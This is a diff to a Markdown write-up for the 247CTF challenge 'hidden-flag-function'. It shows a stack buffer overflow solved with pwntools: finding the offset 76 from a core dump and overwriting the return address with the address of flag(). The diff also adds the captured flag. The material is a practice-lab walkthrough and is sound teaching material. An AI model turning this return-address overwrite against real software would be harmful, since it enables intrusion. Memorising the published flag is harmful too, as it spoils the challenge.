@@ -2,9 +2,11 @@
 
 ## Introduction
 
-`hidden-flag-function` is a 125 point binary-exploitation challenge from 247CTF. The description states:
+`hidden-flag-function` is a 125 point binary-exploitation challenge from
+247CTF. The description states:
 
-> Can you control this applications flow to gain access to the hidden flag function?
+> Can you control this applications flow to gain access to the hidden flag
+> function?
 
 ## Information Gathering
 
@@ -25,7 +27,8 @@ $ checksec ./hidden_flag_function
 
 ### Static Analysis
 
-Opening the program in Binary Ninja, we see that `main` looks like the following:
+Opening the program in Binary Ninja, we see that `main` looks like the
+following:
 
 ```c
 int32_t main(int32_t argc, char** argv, char** envp) {
@@ -45,7 +48,7 @@ int32_t chall() {
 
 As the name suggests, we also found a 'hidden' flag function called 'flag()':
 
-```
+```c
 int32_t flag() {
     void buf;
     fgets(&buf, 0x40, fopen("flag.txt", "r"));
@@ -53,11 +56,16 @@ int32_t flag() {
 }
 ```
 
-From these three functions, we can gleam that the program asks for user input via `scanf` and then returns. Given that we can control the input, we can provide enough input that overflows the `loc` buffer on the `chall` stack frame and overwrite the return address with the address of `flag()`. Let's test this theory out by just trying to crash the program.
+From these three functions, we can gleam that the program asks for user input
+via `scanf` and then returns. Given that we can control the input, we can
+provide enough input that overflows the `loc` buffer on the `chall` stack frame
+and overwrite the return address with the address of `flag()`. Let's test this
+theory out by just trying to crash the program.
 
 ### Dynamic Analysis
 
-Using the above strategy, we see that we can indeed crash the program with long enough input:
+Using the above strategy, we see that we can indeed crash the program with long
+enough input:
 
 ```python
 exe = ELF('./hidden_flag_function')
@@ -67,18 +75,28 @@ io.recvall()
 [*] Process 'hidden_flag_function' stopped with exit code -11 (SIGSEGV)
 ```
 
-We can then get the corefile and see what the faulting address is to determine the offset that overwrote the return address.
+We can then get the corefile and see what the faulting address is to determine
+the offset that overwrote the return address.
 
 ```python
 core = io.corefile
 cyclic_find(core.fault_addr) # yields 76.
 ```
 
-Cool, so now all that is left is sending the address of the symbol `flag()` at that offset and sending it to the program. It does not take any arguments, so we don't have to worry about setting up the stack. We can do that with pwntools like:
+Cool, so now all that is left is sending the address of the symbol `flag()` at
+that offset and sending it to the program. It does not take any arguments, so
+we don't have to worry about setting up the stack. We can do that with pwntools
+like:
 
 ```python
 payload = fit({
-        76: exe.symbols['flag']
+        76: p32(exe.symbols['flag'])
     })
 ```
 
+## Solution
+
+Sending the above gives us the flag:
+`247CTF{b1c2cb7d5a43939f8dc73369ec2dd59d}`. Take a look at `solve.py` for the
+whole thing in one script. The REMOTE flag probably won't work for you, as a
+new container is made for each person each 24 hours.
